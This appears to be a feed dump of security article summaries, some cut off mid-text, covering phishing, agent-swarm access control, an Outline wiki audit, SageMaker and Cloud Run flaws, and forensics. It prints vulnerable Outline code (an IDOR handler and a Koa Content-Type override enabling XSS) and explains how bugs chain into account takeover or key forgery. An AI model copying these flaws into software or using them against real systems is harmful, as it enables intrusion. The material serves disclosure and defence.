    "summary": "Even as they become ever more stealthy with AI-driven tools, threat actors are not giving up on simple, tried-and-true phishing — because it still works. According to new research, attackers are still making mischief with PDFs, the old business standby, and are exploiting growing trust in services like Dropbox. Forcepoint’s X-Labs team has uncovered a multi-stage phishing campaign that exploits PDF files and Dropbox storage through a layered redirection attack. After clicking on what looks like a legitimate PDF, victims are rerouted to a Dropbox logon impersonation page designed to harvest their credentials for internal access, account takeover, or other fraud. “This is a perfect example of why phishing is still the number one way for criminals to get at organizations,” said David Shipley of Beauceron Security. “This attack works because it mimics normal business behavior.” Anatomy of a multi-layered PDF attack In this campaign, victims first receive a professional-sounding email that seems to be part of a normal procurement or tender process and asks them to review an attached document. The type of wording is “commonly used in tender or procurement fraud, where urgency and legitimacy are deliberately created to encourage quick action,” wrote Forcepoint researcher Prashant Kumar . The PDF serves as the primary malware delivery mechanism. Unbeknownst to the victim, the sender address is spoofed or associated with a compromised account. Once they click on the attachment, they are directed to a second PDF hosted on a trusted cloud service (public.blob[.]vercel-storage[.]com), which further redirects them to a fake Dropbox login page. If they take the bait, they’ll log in with their email address and password, and those credentials will be exfiltrated to attacker-controlled command and control (C2) infrastructure. “The first [document] passed the email filter because it’s perfectly legitimate and links to a trusted service,” said Beauceron’s Shipley. “There’s no way to stop that without lots of negative business consequences.” The second one works because it’s not the trusted cloud service’s job to vet content hosted in it. These types of email also often pass standard authentication checks such as sender policy framework (SPF), DomainKeys Identified Mail (DKIM), and domain-based message authentication, reporting, and conformance (DKIM). “The minimal and business-like content helps avoid keyword-based detection, making the message look and feel more like a routine operational request,” Kumar wrote. Thus, attackers are able to convince victims that they need to authenticate to view the documents. This phishing campaign is interesting in that it’s multi-faceted and has been “very well thought out,” noted Erik Avakian , technical counselor at Info-Tech Research Group. And it’s effective because “nothing looks obviously wrong to the end user at any single stage. The original email is clean and gets by most filters, the first PDF opens normally and seems to be hosted on a legitimate cloud service, and the Dropbox login page looks real. “Each step, by itself, passes the sniff test,” he said. “The danger only becomes obvious when you zoom out and look at the entire chain, and most users don’t think about chains. They think in clicks.” Masquerading as a safe document format But after so many warnings about this over time — why are people still so trusting of PDFs and Dropbox? “Because, historically, they’ve actually been trained to be,” said Avakian. PDFs are routinely used in the business world and have been positioned as a safe, read-only document format for invoices, contracts, HR forms, and statements. This applies to Dropbox, too; it’s become a mainstream business tool that employees have been encouraged to use, and has been positioned so that its services “are not some sketchy file-sharing site anymore.” “When people see a PDF or a Dropbox logo, their guard naturally drops,” said Avakian. Familiarity and the need for speed prevent them from pausing and taking a closer look. Attackers know this, and “exploit it perfectly.” On top of this, Avakian pointed out, cloud infrastructure has become a “shield” for attackers. Security awareness has conditioned users to be wary of shady domains, but not of reputable platforms. It’s a mental model that’s outdated, and “attackers are way ahead of it.” ‘Don’t click links’ is not enough Hackers know that many employees tend to touch payment processes and documents, noted Lionel Menchaca , content marketing and technical writing specialist at Forcepoint, so they must be trained to verify that invoices, purchase orders (POs), and contracts are coming from confirmed vendors, affiliates, and agencies. “If they cannot verify, they should report suspicious emails to IT or security teams,” he said. But the precautions don’t stop there, Shipley noted. Employees must develop good e-mail processing habits, such as by taking frequent breaks; simulations can help, as they allow people to break out of routine. Many email clicks (he estimates about 40%) occur when people are on autopilot and aren’t processing at the deep thinking level, “they’re just acting on instinct.” Avakian agreed that email security awareness training must evolve beyond “don’t click links.” Employers and leaders at all levels must understand that modern phishing is increasingly “multi-stage, cloud-hosted, brand-impersonating, and intentionally boring-looking.” PDFs are no longer “safe by default,” and cloud services are no longer “trusted by default.” “This type of incident becomes a great example, and [an] opportunity to build more sophisticated phishing testing,” said Avakian. “The goal is not to embarrass users, but to build security minded habits as to how attacks unfold today.” While the basics still matter, they need to be framed honestly, he said. Hover over links, but understand that cloud-hosted URLs can still be malicious; check the sender’s “from” address and domain, but recognize that compromised or look-alike domains exist; be cautious of unexpected attachments, even PDFs, especially when they lead you somewhere else; treat any login prompts as a moment to pause, “especially when they’re triggered indirectly,” Avakian advised. “Security awareness has to grow up, just like the threats did,” he said. Still, clicks will happen, and effective multi-layered controls limit the damage. Multi-factor authentication (MFA), conditional access, and anomaly detection are critical, and a zero-trust mindset embeds security into a culture where the “trust by default” mindset goes away, said Avakian. “At the end of the day, PDFs and Dropbox aren’t the problem; unquestioned trust is,” he said.",

    "title": "How to build secure agent swarms that power production-grade autonomous systems",
    "summary": "If one autonomous agent is useful, it is natural to ask whether many agents working together could be dramatically more effective. Over the last few weeks, the AI community has been testing this idea in practice by running large numbers of agents in coordinated swarms. The early results are clear: swarms can be far more capable than individual agents, but only under the right conditions. Two distinct patterns have emerged. There are controlled swarms, such as Cursor’s web browser demo , that operate within clearly defined boundaries. There are also uncontrolled swarms, such as OpenClaw , that run with broad, implicit access to user machines and assets. The productivity gains from swarming are real. In controlled environments, swarms demonstrate that large numbers of agents can coordinate work, iterate in parallel, and solve problems faster than any single agent or human team. At the same time, uncontrolled swarms show how easily these same techniques can bypass basic security and access expectations when they are given ambient authority . This tension defines the current moment. Builders can see which swarms unlock, and that running many agents together is qualitatively different from running one. What they cannot yet do is ship these systems safely into enterprise or cloud-native environments using existing operational and security models. Can agent swarms operate safely? Cursor’s web browser demo is a strong example of what a well-scoped swarm can achieve. Thousands of agents coordinated to produce a complex piece of software in a short time. The result was not just faster output, but a demonstration that fully autonomous software development is approaching practical reality when the environment is tightly controlled. In contrast, MoltBot and OpenClaw highlight the risks of applying the same ideas without sufficient constraints. These systems emphasize accessibility and broad capability, but they rely on sweeping access to local machines, filesystems, networks, and credentials. That access is rarely transparent to users and is difficult to reason about or audit. The resulting behavior is impressive, but it comes with significant security and operational risk. Despite these differences, both approaches point to the same underlying shift: swarms allow agents to operate more efficiently and accurately than previously thought possible, but how do we run them at scale? And in the case of OpenClaw specifically, how do we operate them safely? Why agent swarms do not translate to production Today’s swarms run into two fundamental problems. The first is that successful swarms lack operational rails. Most demonstrations rely on local machines or tightly constrained sandboxes. There is no durable hosting model, no monitoring for swarm health over time, and no mechanism to allow swarms to continue operating without being blocked by slow or manual human decisions. As a result, these systems remain confined to experiments and greenfield use cases. The second problem is risk. Uncontrolled swarms raise difficult questions for organizations. How do you prevent company-owned assets from being pulled into a swarm unintentionally? How do you stop new swarms from forming across provisioned infrastructure without oversight? How do you ensure that actions taken by agents are attributable, auditable, and reversible? These are not theoretical concerns. In cloud-native environments, agents run continuously, operate across shared infrastructure, touch production data, and act on behalf of many users. Ambient authority does not exist in these systems, and without explicit identity and access boundaries, swarms can become unsafe and unworkable. What production-grade agent swarms require For swarms to move into production environments, several capabilities are required. There must be a persistent runtime where large numbers of agents can live indefinitely. Like Kubernetes, that runtime must support isolation, coordination, and state without relying on implicit machine-level authority. Agents must have explicit identity from creation through execution. Every action must be attributable and auditable, with access that is scoped, time-bound, and revocable. Finally, swarms must be able to act autonomously without being frequently blocked by human decision making, while still supporting human oversight for high-impact actions. This requires clear separation between what agents can do on their own and what requires approval or escalation. We are excited that platforms and reference architectures are emerging that finally meet these requirements. Agent swarm architecture in practice To make this concrete, 1Password built a real-world scenario in which a large number of agents interact with real infrastructure using production credentials. We partnered with Autonomy because it provides a platform that treats agent identity and isolation boundaries as first-class concerns. Most runtimes are designed for short-lived workloads, stateless services, or systems that inherit identity and access from the underlying environment. In contrast, Autonomy is designed for long-horizon agents where each agent is a concurrent actor with its own cryptographic identity and isolated workspace (filesystem, shell, etc). The Autonomy runtime schedules an actor only when it has a message for that actor to process, so thousands of agents can run in parallel on a single machine. Agents can spawn sub-agents, discover each other, and collaborate over encrypted channels. Here is how we created a swarm: Crucially, identity and authorization are explicit rather than inherited. Each agent has a distinct authenticated identity throughout its lifecycle, and every action is attributable by design. This makes integration with 1Password straightforward. Agents authenticate as themselves, request access dynamically, and receive credentials that are scoped to intent, time-bound, and revocable. This is in sharp contrast to OpenClaw where there is neither attributable identity nor isolated resources. In our demo, agents do not inherit access from the machine or the network. Instead, they authenticate through Autonomy as themselves to receive auditable and limited access through 1Password. An autonomous site reliability demonstration With this foundation in place, we built an autonomous SRE system that operates with minimal interruption. The system monitors reliability signals and, when degradation occurs, spins up swarms of agents to investigate. Some agents inspect logs, others correlate metrics, and others evaluate remediation options. The swarm scales dynamically based on the severity of the issue and scales back down once conditions stabilize. When remediation falls within delegated authority, agents can act directly using credentials provided securely by 1Password. When a situation requires elevated access or carries higher risk, the system pauses and brings a human into the loop to approve or extend access. No access is implicit, no credentials are permanent, and every action is attributable to a specific agent and decision. This integration with 1Password reflects how real systems could safely delegate authority to autonomous agents in cloud environments. Check it out below: How to use 1Password to secure agent swarms Recent attention around agent swarms has highlighted two very different paths forward. On one end are carefully scoped systems, such as Cursor’s internal swarm experiments, that demonstrate what coordinated agents can achieve when they operate within controlled environments. On the other end are systems like OpenClaw that rely on broad, implicit access to user machines, and spontaneously form their own coordination layer through unsafe public channels. The capabilities may look similar on the surface, but the underlying execution models are not. The risk with agent swarms is an execution model that unlocks swarm-level capability by discarding access boundaries and relying on ambient authority. That approach can produce impressive results, but it does not hold up for serious use cases where control, auditability, and trust are required. 1Password can solve this problem. As systems become more autonomous, access decisions shift from individual actions to intent. Humans do not want to approve every agent request. They want to express intent once, such as allowing a swarm to access a specific set of resources for defined purposes, and rely on the system to enforce that intent safely across many agents. Existing access models do not support this shift. They either require constant human intervention or push teams toward unsafe shortcuts that break security controls. Neither approach scales. What is missing is a way to translate a single, high-level access decision into scoped, time-bound authority that can be applied across a swarm while remaining auditable and revocable. Agent swarms require execution environments with explicit identity and durable boundaries. When those foundations exist, as they do in platforms like Autonomy, 1Password becomes the access plane: enforcing intent across swarms with scoped, time-bound authority, without sacrificing speed or scale. If agent swarms are going to become part of production infrastructure, security cannot be something they bypass to be effective. It has to be something that scales with them.",

    "title": "Auditing Outline. Firsthand lessons from comparing manual testing and AI security platforms",
    "summary": "In July 2025, we performed a brief audit of Outline - an OSS wiki similar in many ways to Notion. This activity was meant to evaluate the overall posture of the application, and involved two researchers for a total of 60 person-days. In parallel, we thought it would be a valuable firsthand experience to use three AI security platforms to perform an audit on the very same codebase. Given that all issues are now fixed, we believe it would be interesting to provide an overview of our effort and a few interesting findings and considerations. \"Generate an image that well describes the content of this blog post\" Disclaimer: Outline While this activity was not sufficient to evaluate the entirety of the Outline codebase, we believe we have a good understanding of its quality and resilience. The security posture of the APIs was found to be above industry best practices. Despite our findings, we were pleased to witness a well-thought-out use of security practices and hardening , especially given the numerous functionalities and integrations available. It is important to note that Doyensec audited only Outline OSS ( v0.85.1 ). On-premise enterprise and cloud functionalities were considered out of scope for this engagement. For instance, multi-tenancy is not supported in the OSS on-prem release, hence authorization testing did not consider cross-tenant privilege escalations. Finally, testing focused on Outline code only, leaving all dependencies out of scope. Ironically, several of the bugs discovered were actually caused by external libraries. Disclaimer: AI platforms evaluated during this dry run Large Language Models and AI security platforms are evolving at an exceptionally rapid pace. The observations, assessments, and experiences shared in this post reflect our hands-on exposure at a specific point in time and within a particular technical context. As models, tooling, and defensive capabilities continue to mature, some details discussed here may change or become irrelevant. Instrumentation When performing an in-depth engagement, it is ideal to set up a testing environment with debugging capabilities for both frontend and backend. Outline’s extensive documentation makes this process easy. We started by setting up a local environment as documented in this guide , and executing the following commands: echo \"127.0.0.1 local.outline.dev\" | sudo tee -a /etc/hosts mkdir files The following .env file was used for the configuration(non-empty settings only): NODE_ENV=development URL=https://local.outline.dev:3000 PORT=3000 SECRET_KEY=09732bbde65d4...989 UTILS_SECRET=af7b3d5a6cc...2f1 DEFAULT_LANGUAGE=en_US DATABASE_URL=postgres://user:pass@127.0.0.1:5432/outline REDIS_URL=redis://127.0.0.1:6379 FILE_STORAGE=local FILE_STORAGE_LOCAL_ROOT_DIR=./files/ FILE_STORAGE_UPLOAD_MAX_SIZE=262144000 FORCE_HTTPS=true OIDC_CLIENT_ID=web OIDC_CLIENT_SECRET=secret OIDC_AUTH_URI=http://127.0.0.1:9998/auth OIDC_TOKEN_URI=http://127.0.0.1:9998/oauth/token OIDC_USERINFO_URI=http://127.0.0.1:9998/userinfo OIDC_DISABLE_REDIRECT=true OIDC_USERNAME_CLAIM=preferred_username OIDC_DISPLAY_NAME=OpenID Connect OIDC_SCOPES=openid profile email RATE_LIMITER_ENABLED=true # ––––––––––––– DEBUGGING –––––––––––– ENABLE_UPDATES=false DEBUG=http LOG_LEVEL=debug Zitadel’s OIDC server was used for authentication REDIRECT_URI = https://local.outline.dev:3000/auth/oidc.callback USERS_FILE = ./users.json go run github.com/zitadel/oidc/v3/example/server Finally, VS Code debugging was set up using the following .vscode/launch.json { \"version\" : \"0.2.0\" , \"configurations\" : [ { \"type\" : \"node\" , \"request\" : \"attach\" , \"name\" : \"Attach to Outline Backend\" , \"address\" : \"localhost\" , \"port\" : 9229 , \"restart\" : true , \"protocol\" : \"inspector\" , \"skipFiles\" : [ \" /**\" ], \"cwd\" : \"${workspaceFolder}\" } ] } We also facilitated front-end debugging by adding the following setting at the top of the .babelrc file in order to have source maps. \"sourceMaps\" : true Findings Doyensec researchers discovered and reported seven (7) unique vulnerabilities affecting Outline OSS. ID Title Class Severity Discoverer OUT-Q325-01 Multiple Blind SSRF SSRF Medium 🤖🙍‍♂️ OUT-Q325-02 Vite Path Traversal Injection Flaws Low 🙍‍♂️ OUT-Q325-03 CSRF via Sibling Domains CSRF Medium 🙍‍♂️ OUT-Q325-04 Local File Storage CSP Bypass Insecure Design Low 🙍‍♂️ OUT-Q325-05 Insecure Comparison in VerificationCode Insufficient Cryptography Low 🤖🙍‍♂️ OUT-Q325-06 ContentType Bypass Insecure Design Medium 🙍‍♂️ OUT-Q325-07 Event Access IDOR Low 🤖 Among the bugs we discovered, there are a few that require special mention: OUT-Q325-01 ( GHSA-jfhx-7phw-9gq3 ) is a standard Server-Side Request Forgery bug allowing redirects, but having limited protocols support. Interestingly, this issue affects the self-hosted version only as the cloud release is protected using request-filtering-agent . While giving a quick look at this dependency, we realized that versions 1.x.x and earlier contained a vulnerability ( GHSA-pw25-c82r-75mm ) where HTTPS requests to 127.0.0.1 bypass IP address filtering, while HTTP requests are correctly blocked. While newer versions of the library were already out, Outline was still using an old release, since no GitHub (or other) advisories were ever created for this issue. Whether intentionally or accidentally, this issue was silently fixed for many years. OUT-Q325-02 ( GHSA-pp7p-q8fx-2968 ) turned out to be a bug in the vite-plugin-static-copy npm module. Luckily, it only affects Outline in development mode. OUT-Q325-04 ( GHSA-gcj7-c9jv-fhgf ) was already exploited in this type confusion attack . In fact, browsers like Chrome and Firefox do not block script execution even if the script is served with Content-Disposition: attachment as long as the content type is a valid application/javascript . Please note that this issue does not affect the cloud-hosted version given it’s not using the local file storage engine altogether. Investigating this issue led to the discovery of OUT-Q325-06 , an even more interesting issue. Outline allows inline content for specific (safe) types of files as defined in server/storage/files/BaseStorage.ts /** * Returns the content disposition for a given content type. * * @param contentType The content type * @returns The content disposition */ public getContentDisposition ( contentType ?: string ) { if ( ! contentType ) { return \" attachment \" ; } if ( FileHelper . isAudio ( contentType ) || FileHelper . isVideo ( contentType ) || this . safeInlineContentTypes . includes ( contentType ) ) { return \" inline \" ; } return \" attachment \" ; } Despite this logic, the actual content type of the response was getting overridden. All Outline versions before v0.84.0 (May 2025) were actually vulnerable to Cross-Site Scripting because of this issue, and it was accidentally mitigated by adding the following CSP directive: ctx . set ( \" Content-Security-Policy \" , \" sandbox \" ); When analyzing the root cause, it turned out to be an undocumented insecure behavior of KoaJS . In Outline, the issue was caused by forcing the expected “Content-Type” before the use of response.attachment([filename], [options]) . ctx . set ( \" Content-Type \" , contentType ); ctx . attachment ( fileName , { type : forceDownload ? \" attachment \" : FileStorage . getContentDisposition ( contentType ), // this applies the safe allowed-list }); In fact, the attachment function performs an unexpected : set type ( type ) { type = getType ( type ) if ( type ) { this . set ( ' Content-Type ' , type ) } else { this . remove ( ' Content-Type ' ) } }, This insecure behavior is neither documented nor warned against by the framework. Inverting ctx.set and ctx.attachment is sufficient to fix the issue. Combining OUT-Q325-03, OUT-Q325-06 and Outline’s sharing capabilities, it is possible to take over an admin account, as shown in the following video, affecting the latest version of Outline at the time of testing: Your browser does not support the video tag. Finally, OUT-Q325-07 ( GHSA-h9mv-vg9r-8c7c ) was discovered autonomously by a security AI platform. The events.list API endpoint contains an IDOR vulnerability allowing users to view events for any actor or document within their team without proper authorization. router . post ( \" events.list \" , auth (), pagination (), validate ( T . EventsListSchema ), async ( ctx : APIContext T . EventsListReq > ) => { const { user } = ctx . state . auth ; const { name , events , auditLog , actorId , documentId , collectionId , sort , direction , } = ctx . input . body ; let where : WhereOptions Event > = { teamId : user . teamId , }; if ( auditLog ) { authorize ( user , \" audit \" , user . team ); where . name = events ? intersection ( EventHelper . AUDIT_EVENTS , events ) : EventHelper . AUDIT_EVENTS ; } else { where . name = events ? intersection ( EventHelper . ACTIVITY_EVENTS , events ) : EventHelper . ACTIVITY_EVENTS ; } if ( name && ( where . name as string []). includes ( name )) { where . name = name ; } if ( actorId ) { where = { ... where , actorId }; } if ( documentId ) { where = { ... where , documentId }; } if ( collectionId ) { where = { ... where , collectionId }; const collection = await Collection . findByPk ( collectionId , { userId : user . id , }); authorize ( user , \" read \" , collection ); } else { const collectionIds = await user . collectionIds ({ paranoid : false , }); where = { ... where , [ Op . or ]: [ { collectionId : collectionIds , }, { collectionId : { [ Op . is ]: null , }, }, ], }; } const loadedEvents = await Event . findAll ({ where , order : [[ sort , direction ]], include : [ { model : User , as : \" actor \" , paranoid : false , }, ], offset : ctx . state . pagination . offset , limit : ctx . state . pagination . limit , }); ctx . body = { pagination : ctx . state . pagination , data : await Promise . all ( loadedEvents . map (( event ) => presentEvent ( event , auditLog )) ), }; } ); While the code implements team-level isolation (via the teamId check) and collection-level authorization, it fails to validate access to individual events. An attacker can manipulate the actorId or documentId parameters to view events they shouldn’t have access to. This is particularly concerning since audit log events might contain sensitive information (e.g., document titles). This is a nice catch, something that is not immediately evident to a human auditor without an extended understanding of Outline’s authorization model. On the Use of AI tools Despite the discovery of OUT-Q325-07, our experience using three AI security platforms was, overall, rather disappointing. LLM-based models can identify some vulnerabilities; however, the rate of false positives vastly outweighed the few true positives. What made this especially problematic was how convincing the findings were: the descriptions of the alleged issues were often extremely accurate and well-articulated, making it surprisingly hard to confidently dismiss them as false positives. As a result, cleaning up and validating all AI-reported issues turned into a 40-hour effort. Such overhead during a paid manual audit is hard to justify for us and, more importantly, for our clients. AI hallucinations repeatedly sent us down unexpected rabbit holes, at times making seasoned consultants, with decades of combined experience, feel like complete newbies. While attempting to validate alleged bugs reported by AI, we found ourselves second-guessing our own judgment, losing valuable time that could have been spent on higher-impact tasks. While the future undoubtedly involves LLMs, it is not quite here yet for high-quality security engagements targeting popular, well-audited software. At Doyensec, we will continue to explore and experiment with AI-assisted tooling, adopting it when and where it actually adds value. We don’t want to be remembered as anti-AI hypers but we’re equally not interested in outsourcing our expertise to confident-sounding hallucinations. For now, human intuition, experience, and skepticism - combined with top-notch tooling - remain very hard to beat. Challenge us!",

    "title": "Part 3: Build custom email security reports with Power BI and workbooks in Microsoft Sentinel",
    "summary": "TL;DR : We're releasing a brand-new Power BI template for email security reporting and a major update (v3) to the Microsoft Sentinel workbook. Both solutions share the same rich visuals and insights. Choose Power BI for quick deployment without Sentinel, or the Sentinel workbook for extended data retention and multi-tenant scenarios. Get started in minutes with either option. Introduction Security teams in both small and large organizations track key metrics to make critical security decisions and identify meaningful trends in their organizations. While Microsoft Defender for email and collaboration security provides rich, built-in reporting capabilities, many security teams need custom reporting solutions to create dedicated views, combine multiple data sources, and derive deeper insights tailored to their unique requirements. Earlier last year ( Part 1 and Part 2 ) we shared examples of how you can use workbooks in Microsoft Sentinel to build a custom email security insights dashboard for Microsoft Defender for email and collaboration security. Today we are excited to announce a brand-new Power BI template file designed for Microsoft Defender for email and collaboration security customers. Additionally, we've released an updated version of the Microsoft Defender for email and collaboration Detections and Insights workbook within Microsoft Sentinel. Both offerings feature a unified visual design and structure, ensuring consistent experience no matter which platform you use. Power BI template file - Microsoft Defender for email and collaboration Detections and Insights: Microsoft Sentinel workbook - Microsoft Defender for email and collaboration Detections and Insights: New: Power BI template file for Microsoft Defender for email and collaboration Detections and Insights This custom reporting template file utilizes Power BI and Microsoft Defender Advanced Hunting through the Microsoft Graph security API . This solution is intended for Microsoft Defender for email and collaboration security users who have access to Advanced Hunting but do not use Microsoft Sentinel. You can view Advanced Hunting data from Microsoft Defender for email and collaboration tables for up to 30 days. The reporting template leverages these same tables to present key insights about your organization's email security, showcasing protection, detection, and response metrics supplied by Microsoft Defender for email and collaboration security. Note: If data retention beyond 30 days is required, customers can use the Defender for email and collaboration Detections and Insights workbook in Microsoft Sentinel. You can find the new .pbit template file and detailed instructions on how to set up and use it in the unified Microsoft Sentinel and Microsoft 365 Defender GitHub repository . This new Power BI template uses the same visuals and structure as the Microsoft Defender Detections and Insights workbook in Microsoft Sentinel, providing an easy way to gain deep email security insights across a wide range of use cases. Updated: Microsoft Defender for email and collaboration security Detections and Insights workbook in Microsoft Sentinel We are excited to announce the release of a new version (3) of the Microsoft Defender for email and collaboration security Detections and Insights workbook in Microsoft Sentinel. The workbook is part of the Microsoft Defender solution in Microsoft Sentinel and can be installed and started to use with a few simple clicks. In this release, we have integrated feedback from customers collected over the past several months to introduce new visuals, enhance existing ones, and provide insights aimed at strengthening security operations What’s New Here are some notable changes and new capabilities available in the updated workbook template. Improved structure: Headings and grouped insights have been added to tabs for easier navigation and understanding of metrics. Contextual explanations: Each tab, section, and visual now includes descriptions to help users interpret insights effectively. Drill-down capability: A single “Open query link” action allows users to view the underlying KQL query for each visual, enabling quick investigation and hunting by modifying conditions or removing summaries to access raw data. Detection Dashboard tab enhancements: Added an example Effectiveness metric , updated visuals to focus on overall Microsoft Defender for email and collaboration protection values and introduced new sections for Emerging Threats and Microsoft 365 Secure Email Gateway Performance. New Security Operations Center (SOC) Insights tab: Provides operational metrics such as Security Incident Response, Investigation, and Response Actions for SOC teams. Advanced threat insights: Includes new LLM-based content analysis detections and threat classification insights on the Emails – Phish Detections tab. External forwarding insights: Added deep visibility into Inbox rules and SMTP forwarding in Outlook , including destination details to assess potential data leakage risks. Geo-location improvements: Sender IPv4 insights now include top countries for better geographic context for each Threat types (Malware, Spam, Phish). Enhanced top attacked users and top senders: Added TotalEmailCount and Bad_Traffic_Percentage for richer context in top attacked users and senders charts. Expanded URL click insights: URL click-based threat detection visuals now include Microsoft 365 Copilot as a workload. How to use the workbook across multiple tenants If you manage multiple environments with Microsoft Sentinel or you are an MSSP (Managed Security Service Provider) working across multiple customer tenants, you can also use the workbook in multi‑tenant scenarios. Once the required configuration is in place, you can change the Subscription and Workspace parameters in the workbook to be multi select and load data from one or multiple tenants. This functionality provides comprehensive email security analytics within multi-tenant environments, including: Aggregated multi‑tenant view: You can view aggregated insights across tenants in a single workbook view . By multi‑selecting tenants in the Subscription and Workspace parameters, the workbook automatically loads and combines data from all selected environments for all visuals on all tabs. Side‑by-side‑ comparison: For example, you can compare phishing detection trends or top attacked users across two or more tenants simply by opening the workbook in two browser windows placed side by side. Note: For the multiselect option‑ to work in the current workbook version, you need to manually adjust the Subscription and Workspace parameters. This configuration is planned to become the default in the next release of the workbook. Until then, you can simply apply this change using the workbook’s Edit mode. How to get the updated workbook version The latest version of the Microsoft Defender for email and collaboration Detections and Insights workbook is available as part of the Microsoft Defender solution in the Microsoft Sentinel - Content hub. Version 3.0.13 of the solution has the updated workbook template. If you already have the Microsoft Defender deployed, version 3.0.13 is available now as an update. After you install the update, you will have the new workbook template available to use. When Microsoft Defender is installed for the first time, the latest version is deployed, and the updated template becomes available for immediate use. Editing and sharing the workbook You can customize each visual easily. Simply edit the workbook after saving, then adjust the underlying KQL query, change the type of the visual, or create new insights.

We identified an issue where the HMAC secret key is stored in environment variables and disclosed via the DescribeTrainingJob API. This allows third parties with DescribeTrainingJob permissions to extract the key, forge cloud-pickled payloads with valid HMACs, and overwrite S3 objects. CVE-2026-1778 - Insecure TLS Configuration in SageMaker Python SDK SageMaker Python SDK is an open source library for training and deploying machine learning models on Amazon SageMaker. We identified an issue where SSL certificate verification was globally disabled in the Triton Python backend. This configuration was introduced to work around SSL errors during model downloads from public sources (e.g., TorchVision) and it affected all HTTPS connections when the Triton Python model was imported. Impacted versions: - HMAC Configuration in SageMaker Python SDK v3 - HMAC Configuration in SageMaker Python SDK v2 - Insecure TLS Configuration in SageMaker Python SDK v3 - Insecure TLS Configuration in SageMaker Python SDK v2 Please refer to the article below for the most up-to-date and complete information related to this AWS Security Bulletin.",

NTLM is a series of security protocols that were introduced in the 1990s, but since Kerberos became the default protocol in Windows 2000, its use has declined with each passing year. Still, many legacy enterprise systems still support or use NTLM, making them vulnerability to NTLM relay attacks , for example. And while Microsoft administrators have been preparing for the demise of NTLM for years , many still struggle to rid their networks of the protocol . In recent years, hackers have exploited NTLM flaws to gain full access to networks, so the disadvantages of supporting it outweigh the advantages. Microsoft now considers NTLM deprecated. A timetable for the deactivation can be found on the Windows IT Pro Blog .",

    "title": "Devices",
    "summary": "Something I learned very early on as a DF/IR consultant was that you're likely never going to run into a perfect environment as an on-call responder. In fact, the best you can hope for is an environment with the default logging, for the OS and applications, and that the logs haven't been cleared. Even then, those two conditions aren't always the case. Even today, in 2026, I regularly see environments where auditing of successful logins has been disabled, so they don't appear in the Security Event Log. As such, it's not only important to keep up with what's available from the default installation of an endpoint, and what sources can be used to validate your findings, but also note what's available depending upon the applications installed. However, what's most important are your analysis goals. For example, it's easy to say, \"I want to see all USB devices connected to the endpoint\", and not provide a timeframe. However, to what are these devices pursuant? IP theft? Violation of acceptable use policies? What about CSAM production? After all, smartphones and digital cameras can be connected to a computer via a USB cable, but use different protocols, and information about the devices being connected can be found in other locations than those that we traditionally look to as a result of training we may receive. When it comes to devices connected to a Windows system, things have definitely changed over time. Cory and I published a peer-reviewed paper in 2005 , covering USB artifacts on Windows XP systems. Since then, there's been quite a few changes to Windows, and as one would expect, how devices connected to an endpoint are tracked. Nicole mentioned some time ago (2014) that different protocols used by different devices (in this case, smartphones) have an impact on investigations; unfortunately, as time has gone on, I've had a hard time linking back to Nicole's published research or even her presentations, but one of her presentations can be found here . This WindowsIR blog post describes the fact that some of the Windows Event Log files we might look to in order to investigate USB devices connected to an endpoint have been seen to be disabled, and recommended some alternative data sources. Similarly, this NirSoft page for the USBDeView application similarly recommends data sources. Speaking of the WindowsIR blog, here's a whole series of blog posts about just \"USB devices\". Now, as to why I'm writing this blog post, in the first place... I recently ran across this LinkedIn post from Garrett Moreau, which I thought was interesting. He's right, in that information about devices connected to/removed from the endpoint is stored in the Registry, and not just in the USBStor key. RegRipper , for example, includes multiple plugins within the \"devices\" category. What's really eye-opening is to read through the comments to the post; one comment, for example, states the following: Quick note for defenders, default logging settings don’t provide much depth. USB events are recorded under the Applications and Services Logs > Microsoft > Windows > DriverFrameworks-UserMode > Operational path, but this log must be activated manually. Previous versions of Windows required activation of these events using PowerShell. While the statement is true, this goes back to what I said earlier about traditional training, and the need to not only keep playbooks up to date, but to also pursue other alternative data sources. A data source we're familiar with, the Microsoft-Windows-DriverFrameworks-UserMode Event Log , is now disabled by default, and as stated, doesn't provide \"much depth\". However, if understanding the USB devices connected to an endpoint are part of your investigative goals, then keeping playbooks updated is key. Some of the comments go one to suggest other data sources that might be used to add granularity or context to your investigations, such as shellbags (for directory transversal), etc. In the past, I've found the Application Event Log, and in particular, MsiInstaller events to be useful in illustrating attempts to install applications from a USB device. My recommendation is this...first and foremost, understand your analysis goals; what are you attempting to show, to prove or disprove? From there, maintain playbooks associated with these goals, and if you're in a role where you're dealing with different implementations and applications, keep documentation on any new findings that apply to specific edge cases, as you never know when you will see such things again. An excellent example of this is when Don Weber worked a case where the LANDesk Software Monitoring application was installed on an endpoint, and found that the application provided valuable information regarding program execution .",

This flaw allowed a low-privileged attacker to bypass Identity and Access Management (IAM) controls and invoke authenticated Cloud Run services despite lacking permissions. Cloud Monitoring Uptime Checks can be configured to authenticate against HTTP targets using the Monitoring Service Agent's ID token. The Monitoring Service Agent (service-PROJECT_NUMBER@gcp-sa-monitoring-notification.iam.gserviceaccount.com) is a Google-managed identity that, by default, is granted the run.routes.invoke permission. This permission allows the holder to call authenticated Cloud Run endpoints. By testing an Uptime Check on an authenticated Cloud Run endpoint, an attacker with the extremely limited monitoring.uptimeCheckConfigViewer role could invoke that endpoint with arbitrary parameters using the Service Agent’s identity.

    "summary": "Welcome to volume twenty-seven of Scrolls , a newsletter for sharing cool stuff from the IndieWeb , Fediverse & Cybersecurity realms. This week we ponder a better, although imperfect web, we encourage everyone to join the Fediverse movement, and sigh … AI continues to make us sad. But ya know what doesn’t make me sad? This dope bird mage. 🐦 🧙 IndieWeb The “old web” wasn’t perfect , but it’s hard to look at what the web has become and not wonder how it was lost . Those that remember have sought to build a once-again “open web”, but things are never that simple . Problems abound in this quest to be sure, but for every obstacle, there are ways to mitigate and build a better, more open, more cooperative , more human web—it doesn’t need to be perfect . The lifeblood of this better web is the classic personal website . If you don’t already have one, what better time than now to do so! There are so many ways to get one up and running. There are a lot of reasons to have your own website and do some blogging there too! And no, simply having a social media presence is no substitute for an actual website that you own . Personally, I like having both a website and a standard (Fedi) social media presence. But there are options for making your website/blog plenty social if you’d like. In fact, when it’s your site, it can be whatever you want it to be . You own it, so you can tinker with it to your hearts content , no obligations . You can update and change whatever you want, whenever you want. If you’re worried about the technical aspects of creating and managing a website, don’t ! There’s plenty of no code or low-code options available. Does your website have to be good? Does it need to look like other people’s sites ? No ! In fact, I’d encourage you to make it unique. Make it you . Hell , make it purposefully worse than other sites you see. Honestly that’s the beauty of the personal, IndieWeb. Doin’ whatever you like. Fediverse Who would you rather trust to safeguard your online communities , your digital 